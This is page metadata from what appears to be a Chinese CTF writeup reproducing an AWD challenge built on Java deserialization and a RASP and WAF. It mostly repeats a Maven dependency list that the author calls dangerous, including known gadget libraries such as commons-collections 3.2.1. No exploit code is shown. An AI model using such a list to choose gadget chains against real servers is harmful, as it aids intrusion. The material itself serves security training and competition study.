&lt;version&gt;1.7.36&lt;/version&gt; 252 &lt;/dependency&gt; 253 254 &lt;dependency&gt; 255 &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; 256 &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; 257 &lt;version&gt;2.17.2&lt;/version&gt; 258 &lt;/dependency&gt; 259 260 &lt;dependency&gt; 261 &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; 262 &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt; 263 &lt;version&gt;2.17.2&lt;/version&gt; 264 &lt;/dependency&gt; 265 266 &lt;dependency&gt; 267 &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; 268 &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; 269 &lt;version&gt;1.2.11&lt;/version&gt; 270 &lt;/dependency&gt; 271 272 &lt;dependency&gt; 273 &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; 274 &lt;artifactId&gt;logback-core&lt;/artifactId&gt; 275 &lt;version&gt;1.2.11&lt;/version&gt; 276 &lt;/dependency&gt; 277 278 &lt;!-- OSGI --&gt; 279 &lt;dependency&gt; 280 &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt; 281 &lt;artifactId&gt;osgi-resource-locator&lt;/artifactId&gt; 282 &lt;version&gt;1.0.3&lt;/version&gt; 283 &lt;/dependency&gt; 284 285 &lt;!-- SnakeYAML --&gt; 286 &lt;dependency&gt; 287 &lt;groupId&gt;org.yaml&lt;/groupId&gt; 288 &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt; 289 &lt;version&gt;1.29&lt;/version&gt; 290 &lt;/dependency&gt; 291 292 &lt;!-- Spring Framework --&gt; 293 &lt;dependency&gt; 294 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 295 &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; 296 &lt;version&gt;5.3.23&lt;/version&gt; 297 &lt;/dependency&gt; 298 299 &lt;dependency&gt; 300 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 301 &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; 302 &lt;version&gt;5.3.23&lt;/version&gt; 303 &lt;/dependency&gt; 304 305 &lt;dependency&gt; 306 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 307 &lt;artifactId&gt;spring-context&lt;/artifactId&gt; 308 &lt;version&gt;5.3.23&lt;/version&gt; 309 &lt;/dependency&gt; 310 311 &lt;dependency&gt; 312 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 313 &lt;artifactId&gt;spring-core&lt;/artifactId&gt; 314 &lt;version&gt;5.3.23&lt;/version&gt; 315 &lt;/dependency&gt; 316 317 &lt;dependency&gt; 318 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 319 &lt;artifactId&gt;spring-expression&lt;/artifactId&gt; 320 &lt;version&gt;5.3.23&lt;/version&gt; 321 &lt;/dependency&gt; 322 323 &lt;dependency&gt; 324 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 325 &lt;artifactId&gt;spring-jcl&lt;/artifactId&gt; 326 &lt;version&gt;5.3.23&lt;/version&gt; 327 &lt;/dependency&gt; 328 329 &lt;dependency&gt; 330 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 331 &lt;artifactId&gt;spring-web&lt;/artifactId&gt; 332 &lt;version&gt;5.3.23&lt;/version&gt; 333 &lt;/dependency&gt; 334 335 &lt;dependency&gt; 336 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 337 &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; 338 &lt;version&gt;5.3.23&lt;/version&gt; 339 &lt;/dependency&gt; 340 341 &lt;dependency&gt; 342 &lt;groupId&gt;org.springframework&lt;/groupId&gt; 343 &lt;artifactId&gt;spring-tx&lt;/artifactId&gt; 344 &lt;version&gt;5.3.30&lt;/version&gt; 345 &lt;/dependency&gt; 346 347 &lt;!-- Spring Boot --&gt; 348 &lt;dependency&gt; 349 &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 350 &lt;artifactId&gt;spring-boot&lt;/artifactId&gt; 351 &lt;version&gt;2.6.13&lt;/version&gt; 352 &lt;/dependency&gt; 353 354 &lt;dependency&gt; 355 &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 356 &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt; 357 &lt;version&gt;2.6.13&lt;/version&gt; 358 &lt;/dependency&gt; 359 360 &lt;dependency&gt; 361 &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 362 &lt;artifactId&gt;spring-boot-jarmode-layertools&lt;/artifactId&gt; 363 &lt;version&gt;2.6.13&lt;/version&gt; 364 &lt;/dependency&gt; 365 366 &lt;!-- Tomcat --&gt; 367 &lt;dependency&gt; 368 &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; 369 &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; 370 &lt;version&gt;9.0.68&lt;/version&gt; 371 &lt;/dependency&gt; 372 373 &lt;dependency&gt; 374 &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; 375 &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt; 376 &lt;version&gt;9.0.68&lt;/version&gt; 377 &lt;/dependency&gt; 378 379 &lt;dependency&gt; 380 &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; 381 &lt;artifactId&gt;tomcat-embed-websocket&lt;/artifactId&gt; 382 &lt;version&gt;9.0.68&lt;/version&gt; 383 &lt;/dependency&gt; 相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-12-11T11:00:00+08:00">
    <meta property="article:modified_time" content="2025-12-11T11:00:00+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Javasec">
    <meta property="article:tag" content="Java">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="强网拟态2025决赛awd_rasp复现">
<meta name="twitter:description" content="这是一个含有非常多危险依赖的题，如下：
  1 &lt;dependencies&gt;
  2
  3        &lt;!-- AOP / Aspect --&gt;
  4        &lt;dependency&gt;
  5            &lt;groupId&gt;org.glassfish.hk2.external&lt;/groupId&gt;
  6            &lt;artifactId&gt;aopalliance-repackaged&lt;/artifactId&gt;
  7            &lt;version&gt;2.6.1&lt;/version&gt;
  8        &lt;/dependency&gt;
  9
 10        &lt;dependency&gt;
 11            &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
 12            &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;
 13            &lt;version&gt;1.9.2&lt;/version&gt;
 14        &lt;/dependency&gt;
 15
 16        &lt;!-- Oracle Coherence --&gt;
 17        &lt;dependency&gt;
 18            &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt;
 19            &lt;artifactId&gt;coherence&lt;/artifactId&gt;
 20            &lt;version&gt;14.1.1-0-3&lt;/version&gt;
 21        &lt;/dependency&gt;
 22
 23        &lt;dependency&gt;
 24            &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt;
 25            &lt;artifactId&gt;coherence-rest&lt;/artifactId&gt;
 26            &lt;version&gt;14.1.1-0-3&lt;/version&gt;
 27        &lt;/dependency&gt;
 28
 29        &lt;!-- Commons --&gt;
 30        &lt;dependency&gt;
 31            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
 32            &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
 33            &lt;version&gt;1.9.2&lt;/version&gt;
 34        &lt;/dependency&gt;
 35
 36        &lt;dependency&gt;
 37            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
 38            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
 39            &lt;version&gt;3.2.1&lt;/version&gt;
 40        &lt;/dependency&gt;
 41
 42        &lt;dependency&gt;
 43            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
 44            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
 45            &lt;version&gt;4.0&lt;/version&gt;
 46        &lt;/dependency&gt;
 47
 48        &lt;dependency&gt;
 49            &lt;groupId&gt;commons-logging&lt;/groupId&gt;
 50            &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;
 51            &lt;version&gt;1.2&lt;/version&gt;
 52        &lt;/dependency&gt;
 53
 54        &lt;!-- Groovy --&gt;
 55        &lt;dependency&gt;
 56            &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
 57            &lt;artifactId&gt;groovy&lt;/artifactId&gt;
 58            &lt;version&gt;2.3.9&lt;/version&gt;
 59        &lt;/dependency&gt;
 60
 61        &lt;!-- HK2 --&gt;
 62        &lt;dependency&gt;
 63            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 64            &lt;artifactId&gt;hk2-api&lt;/artifactId&gt;
 65            &lt;version&gt;2.6.1&lt;/version&gt;
 66        &lt;/dependency&gt;
 67
 68        &lt;dependency&gt;
 69            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 70            &lt;artifactId&gt;hk2-locator&lt;/artifactId&gt;
 71            &lt;version&gt;2.6.1&lt;/version&gt;
 72        &lt;/dependency&gt;
 73
 74        &lt;dependency&gt;
 75            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 76            &lt;artifactId&gt;hk2-utils&lt;/artifactId&gt;
 77            &lt;version&gt;2.6.1&lt;/version&gt;
 78        &lt;/dependency&gt;
 79
 80        &lt;!-- Jackson --&gt;
 81        &lt;dependency&gt;
 82            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 83            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;
 84            &lt;version&gt;2.13.4&lt;/version&gt;
 85        &lt;/dependency&gt;
 86
 87        &lt;dependency&gt;
 88            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 89            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
 90            &lt;version&gt;2.13.4&lt;/version&gt;
 91        &lt;/dependency&gt;
 92
 93        &lt;dependency&gt;
 94            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 95            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
 96            &lt;version&gt;2.13.4.2&lt;/version&gt;
 97        &lt;/dependency&gt;
 98
 99        &lt;dependency&gt;
100            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
101            &lt;artifactId&gt;jackson-datatype-jdk8&lt;/artifactId&gt;
102            &lt;version&gt;2.13.4&lt;/version&gt;
103        &lt;/dependency&gt;
104
105        &lt;dependency&gt;
106            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
107            &lt;artifactId&gt;jackson-datatype-jsr310&lt;/artifactId&gt;
108            &lt;version&gt;2.13.4&lt;/version&gt;
109        &lt;/dependency&gt;
110
111        &lt;dependency&gt;
112            &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt;
113            &lt;artifactId&gt;jackson-jaxrs-base&lt;/artifactId&gt;
114            &lt;version&gt;2.13.4&lt;/version&gt;
115        &lt;/dependency&gt;
116
117        &lt;dependency&gt;
118            &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt;
119            &lt;artifactId&gt;jackson-jaxrs-json-provider&lt;/artifactId&gt;
120            &lt;version&gt;2.13.4&lt;/version&gt;
121        &lt;/dependency&gt;
122
123        &lt;dependency&gt;
124            &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt;
125            &lt;artifactId&gt;jackson-module-jaxb-annotations&lt;/artifactId&gt;
126            &lt;version&gt;2.13.4&lt;/version&gt;
127        &lt;/dependency&gt;
128
129        &lt;dependency&gt;
130            &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt;
131            &lt;artifactId&gt;jackson-module-parameter-names&lt;/artifactId&gt;
132            &lt;version&gt;2.13.4&lt;/version&gt;
133        &lt;/dependency&gt;
134
135        &lt;!-- Jakarta --&gt;
136        &lt;dependency&gt;
137            &lt;groupId&gt;jakarta.activation&lt;/groupId&gt;
138            &lt;artifactId&gt;jakarta.activation-api&lt;/artifactId&gt;
139            &lt;version&gt;1.2.2&lt;/version&gt;
140        &lt;/dependency&gt;
141
142        &lt;dependency&gt;
143            &lt;groupId&gt;jakarta.annotation&lt;/groupId&gt;
144            &lt;artifactId&gt;jakarta.annotation-api&lt;/artifactId&gt;
145            &lt;version&gt;1.3.5&lt;/version&gt;
146        &lt;/dependency&gt;
147
148        &lt;dependency&gt;
149            &lt;groupId&gt;jakarta.validation&lt;/groupId&gt;
150            &lt;artifactId&gt;jakarta.validation-api&lt;/artifactId&gt;
151            &lt;version&gt;2.0.2&lt;/version&gt;
152        &lt;/dependency&gt;
153
154        &lt;dependency&gt;
155            &lt;groupId&gt;jakarta.ws.rs&lt;/groupId&gt;
156            &lt;artifactId&gt;jakarta.ws.rs-api&lt;/artifactId&gt;
157            &lt;version&gt;2.1.6&lt;/version&gt;
158        &lt;/dependency&gt;
159
160        &lt;dependency&gt;
161            &lt;groupId&gt;jakarta.xml.bind&lt;/groupId&gt;
162            &lt;artifactId&gt;jakarta.xml.bind-api&lt;/artifactId&gt;
163            &lt;version&gt;2.3.3&lt;/version&gt;
164        &lt;/dependency&gt;
165
166        &lt;!-- Javassist --&gt;
167        &lt;dependency&gt;
168            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
169            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
170            &lt;version&gt;3.25.0-GA&lt;/version&gt;
171        &lt;/dependency&gt;
172
173        &lt;!-- Jersey --&gt;
174        &lt;dependency&gt;
175            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
176            &lt;artifactId&gt;jersey-client&lt;/artifactId&gt;
177            &lt;version&gt;2.35&lt;/version&gt;
178        &lt;/dependency&gt;
179
180        &lt;dependency&gt;
181            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
182            &lt;artifactId&gt;jersey-common&lt;/artifactId&gt;
183            &lt;version&gt;2.35&lt;/version&gt;
184        &lt;/dependency&gt;
185
186        &lt;dependency&gt;
187            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
188            &lt;artifactId&gt;jersey-container-jdk-http&lt;/artifactId&gt;
189            &lt;version&gt;2.35&lt;/version&gt;
190        &lt;/dependency&gt;
191
192        &lt;dependency&gt;
193            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
194            &lt;artifactId&gt;jersey-container-servlet&lt;/artifactId&gt;
195            &lt;version&gt;2.35&lt;/version&gt;
196        &lt;/dependency&gt;
197
198        &lt;dependency&gt;
199            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
200            &lt;artifactId&gt;jersey-container-servlet-core&lt;/artifactId&gt;
201            &lt;version&gt;2.35&lt;/version&gt;
202        &lt;/dependency&gt;
203
204        &lt;dependency&gt;
205            &lt;groupId&gt;org.glassfish.jersey.ext&lt;/groupId&gt;
206            &lt;artifactId&gt;jersey-entity-filtering&lt;/artifactId&gt;
207            &lt;version&gt;2.35&lt;/version&gt;
208        &lt;/dependency&gt;
209
210        &lt;dependency&gt;
211            &lt;groupId&gt;org.glassfish.jersey.inject&lt;/groupId&gt;
212            &lt;artifactId&gt;jersey-hk2&lt;/artifactId&gt;
213            &lt;version&gt;2.35&lt;/version&gt;
214        &lt;/dependency&gt;
215
216        &lt;dependency&gt;
217            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
218            &lt;artifactId&gt;jersey-media-json-jackson&lt;/artifactId&gt;
219            &lt;version&gt;2.35&lt;/version&gt;
220        &lt;/dependency&gt;
221
222        &lt;dependency&gt;
223            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
224            &lt;artifactId&gt;jersey-media-sse&lt;/artifactId&gt;
225            &lt;version&gt;2.35&lt;/version&gt;
226        &lt;/dependency&gt;
227
228        &lt;dependency&gt;
229            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
230            &lt;artifactId&gt;jersey-server&lt;/artifactId&gt;
231            &lt;version&gt;2.35&lt;/version&gt;
232        &lt;/dependency&gt;
233
234        &lt;!-- JTA --&gt;
235        &lt;dependency&gt;
236            &lt;groupId&gt;javax.transaction&lt;/groupId&gt;
237            &lt;artifactId&gt;jta&lt;/artifactId&gt;
238            &lt;version&gt;1.1&lt;/version&gt;
239        &lt;/dependency&gt;
240
241        &lt;!-- Logging --&gt;
242        &lt;dependency&gt;
243            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
244            &lt;artifactId&gt;jul-to-slf4j&lt;/artifactId&gt;
245            &lt;version&gt;1.7.36&lt;/version&gt;
246        &lt;/dependency&gt;
247
248        &lt;dependency&gt;
249            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
250            &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;
251            &lt;version&gt;1.7.36&lt;/version&gt;
252        &lt;/dependency&gt;
253
254        &lt;dependency&gt;
255            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
256            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
257            &lt;version&gt;2.17.2&lt;/version&gt;
258        &lt;/dependency&gt;
259
260        &lt;dependency&gt;
261            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
262            &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;
263            &lt;version&gt;2.17.2&lt;/version&gt;
264        &lt;/dependency&gt;
265
266        &lt;dependency&gt;
267            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
268            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
269            &lt;version&gt;1.2.11&lt;/version&gt;
270        &lt;/dependency&gt;
271
272        &lt;dependency&gt;
273            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
274            &lt;artifactId&gt;logback-core&lt;/artifactId&gt;
275            &lt;version&gt;1.2.11&lt;/version&gt;
276        &lt;/dependency&gt;
277
278        &lt;!-- OSGI --&gt;
279        &lt;dependency&gt;
280            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
281            &lt;artifactId&gt;osgi-resource-locator&lt;/artifactId&gt;
282            &lt;version&gt;1.0.3&lt;/version&gt;
283        &lt;/dependency&gt;
284
285        &lt;!-- SnakeYAML --&gt;
286        &lt;dependency&gt;
287            &lt;groupId&gt;org.yaml&lt;/groupId&gt;
288            &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
289            &lt;version&gt;1.29&lt;/version&gt;
290        &lt;/dependency&gt;
291
292        &lt;!-- Spring Framework --&gt;
293        &lt;dependency&gt;
294            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
295            &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;
296            &lt;version&gt;5.3.23&lt;/version&gt;
297        &lt;/dependency&gt;
298
299        &lt;dependency&gt;
300            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
301            &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
302            &lt;version&gt;5.3.23&lt;/version&gt;
303        &lt;/dependency&gt;
304
305        &lt;dependency&gt;
306            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
307            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
308            &lt;version&gt;5.3.23&lt;/version&gt;
309        &lt;/dependency&gt;
310
311        &lt;dependency&gt;
312            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
313            &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
314            &lt;version&gt;5.3.23&lt;/version&gt;
315        &lt;/dependency&gt;
316
317        &lt;dependency&gt;
318            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
319            &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;
320            &lt;version&gt;5.3.23&lt;/version&gt;
321        &lt;/dependency&gt;
322
323        &lt;dependency&gt;
324            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
325            &lt;artifactId&gt;spring-jcl&lt;/artifactId&gt;
326            &lt;version&gt;5.3.23&lt;/version&gt;
327        &lt;/dependency&gt;
328
329        &lt;dependency&gt;
330            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
331            &lt;artifactId&gt;spring-web&lt;/artifactId&gt;
332            &lt;version&gt;5.3.23&lt;/version&gt;
333        &lt;/dependency&gt;
334
335        &lt;dependency&gt;
336            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
337            &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;
338            &lt;version&gt;5.3.23&lt;/version&gt;
339        &lt;/dependency&gt;
340
341        &lt;dependency&gt;
342            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
343            &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;
344            &lt;version&gt;5.3.30&lt;/version&gt;
345        &lt;/dependency&gt;
346
347        &lt;!-- Spring Boot --&gt;
348        &lt;dependency&gt;
349            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
350            &lt;artifactId&gt;spring-boot&lt;/artifactId&gt;
351            &lt;version&gt;2.6.13&lt;/version&gt;
352        &lt;/dependency&gt;
353
354        &lt;dependency&gt;
355            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
356            &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;
357            &lt;version&gt;2.6.13&lt;/version&gt;
358        &lt;/dependency&gt;
359
360        &lt;dependency&gt;
361            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
362            &lt;artifactId&gt;spring-boot-jarmode-layertools&lt;/artifactId&gt;
363            &lt;version&gt;2.6.13&lt;/version&gt;
364        &lt;/dependency&gt;
365
366        &lt;!-- Tomcat --&gt;
367        &lt;dependency&gt;
368            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
369            &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
370            &lt;version&gt;9.0.68&lt;/version&gt;
371        &lt;/dependency&gt;
372
373        &lt;dependency&gt;
374            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
375            &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;
376            &lt;version&gt;9.0.68&lt;/version&gt;
377        &lt;/dependency&gt;
378
379        &lt;dependency&gt;
380            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
381            &lt;artifactId&gt;tomcat-embed-websocket&lt;/artifactId&gt;
382            &lt;version&gt;9.0.68&lt;/version&gt;
383        &lt;/dependency&gt;
相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "强网拟态2025决赛awd_rasp复现",
      "item": "http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%86%B3%E8%B5%9B/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "强网拟态2025决赛awd_rasp复现",
  "name": "强网拟态2025决赛awd_rasp复现",
  "description": "这是一个含有非常多危险依赖的题，如下：\n1 \u0026lt;dependencies\u0026gt; 2 3 \u0026lt;!-- AOP / Aspect --\u0026gt; 4 \u0026lt;dependency\u0026gt; 5 \u0026lt;groupId\u0026gt;org.glassfish.hk2.external\u0026lt;/groupId\u0026gt; 6 \u0026lt;artifactId\u0026gt;aopalliance-repackaged\u0026lt;/artifactId\u0026gt; 7 \u0026lt;version\u0026gt;2.6.1\u0026lt;/version\u0026gt; 8 \u0026lt;/dependency\u0026gt; 9 10 \u0026lt;dependency\u0026gt; 11 \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; 12 \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; 13 \u0026lt;version\u0026gt;1.9.2\u0026lt;/version\u0026gt; 14 \u0026lt;/dependency\u0026gt; 15 16 \u0026lt;!-- Oracle Coherence --\u0026gt; 17 \u0026lt;dependency\u0026gt; 18 \u0026lt;groupId\u0026gt;com.oracle.coherence.ce\u0026lt;/groupId\u0026gt; 19 \u0026lt;artifactId\u0026gt;coherence\u0026lt;/artifactId\u0026gt; 20 \u0026lt;version\u0026gt;14.1.1-0-3\u0026lt;/version\u0026gt; 21 \u0026lt;/dependency\u0026gt; 22 23 \u0026lt;dependency\u0026gt; 24 \u0026lt;groupId\u0026gt;com.oracle.coherence.ce\u0026lt;/groupId\u0026gt; 25 \u0026lt;artifactId\u0026gt;coherence-rest\u0026lt;/artifactId\u0026gt; 26 \u0026lt;version\u0026gt;14.1.1-0-3\u0026lt;/version\u0026gt; 27 \u0026lt;/dependency\u0026gt; 28 29 \u0026lt;!-- Commons --\u0026gt; 30 \u0026lt;dependency\u0026gt; 31 \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; 32 \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; 33 \u0026lt;version\u0026gt;1.9.2\u0026lt;/version\u0026gt; 34 \u0026lt;/dependency\u0026gt; 35 36 \u0026lt;dependency\u0026gt; 37 \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; 38 \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; 39 \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; 40 \u0026lt;/dependency\u0026gt; 41 42 \u0026lt;dependency\u0026gt; 43 \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; 44 \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; 45 \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; 46 \u0026lt;/dependency\u0026gt; 47 48 \u0026lt;dependency\u0026gt; 49 \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; 50 \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; 51 \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; 52 \u0026lt;/dependency\u0026gt; 53 54 \u0026lt;!-- Groovy --\u0026gt; 55 \u0026lt;dependency\u0026gt; 56 \u0026lt;groupId\u0026gt;org.codehaus.groovy\u0026lt;/groupId\u0026gt; 57 \u0026lt;artifactId\u0026gt;groovy\u0026lt;/artifactId\u0026gt; 58 \u0026lt;version\u0026gt;2.3.9\u0026lt;/version\u0026gt; 59 \u0026lt;/dependency\u0026gt; 60 61 \u0026lt;!-- HK2 --\u0026gt; 62 \u0026lt;dependency\u0026gt; 63 \u0026lt;groupId\u0026gt;org.glassfish.hk2\u0026lt;/groupId\u0026gt; 64 \u0026lt;artifactId\u0026gt;hk2-api\u0026lt;/artifactId\u0026gt; 65 \u0026lt;version\u0026gt;2.6.1\u0026lt;/version\u0026gt; 66 \u0026lt;/dependency\u0026gt; 67 68 \u0026lt;dependency\u0026gt; 69 \u0026lt;groupId\u0026gt;org.glassfish.hk2\u0026lt;/groupId\u0026gt; 70 \u0026lt;artifactId\u0026gt;hk2-locator\u0026lt;/artifactId\u0026gt; 71 \u0026lt;version\u0026gt;2.6.1\u0026lt;/version\u0026gt; 72 \u0026lt;/dependency\u0026gt; 73 74 \u0026lt;dependency\u0026gt; 75 \u0026lt;groupId\u0026gt;org.glassfish.hk2\u0026lt;/groupId\u0026gt; 76 \u0026lt;artifactId\u0026gt;hk2-utils\u0026lt;/artifactId\u0026gt; 77 \u0026lt;version\u0026gt;2.6.1\u0026lt;/version\u0026gt; 78 \u0026lt;/dependency\u0026gt; 79 80 \u0026lt;!-- Jackson --\u0026gt; 81 \u0026lt;dependency\u0026gt; 82 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; 83 \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; 84 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 85 \u0026lt;/dependency\u0026gt; 86 87 \u0026lt;dependency\u0026gt; 88 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; 89 \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; 90 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 91 \u0026lt;/dependency\u0026gt; 92 93 \u0026lt;dependency\u0026gt; 94 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; 95 \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; 96 \u0026lt;version\u0026gt;2.13.4.2\u0026lt;/version\u0026gt; 97 \u0026lt;/dependency\u0026gt; 98 99 \u0026lt;dependency\u0026gt; 100 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.datatype\u0026lt;/groupId\u0026gt; 101 \u0026lt;artifactId\u0026gt;jackson-datatype-jdk8\u0026lt;/artifactId\u0026gt; 102 \u0026lt;version\u0026gt;2.13.4\u0026lt;/version\u0026gt; 103 \u0026lt;/dependency\u0026gt; 104 105 \u0026lt;dependency\u0026gt; 106 \u0026lt;groupId\u0026gt;com.fasterxml.jackson.datatype\u0026lt;/groupId\u0026gt; 107 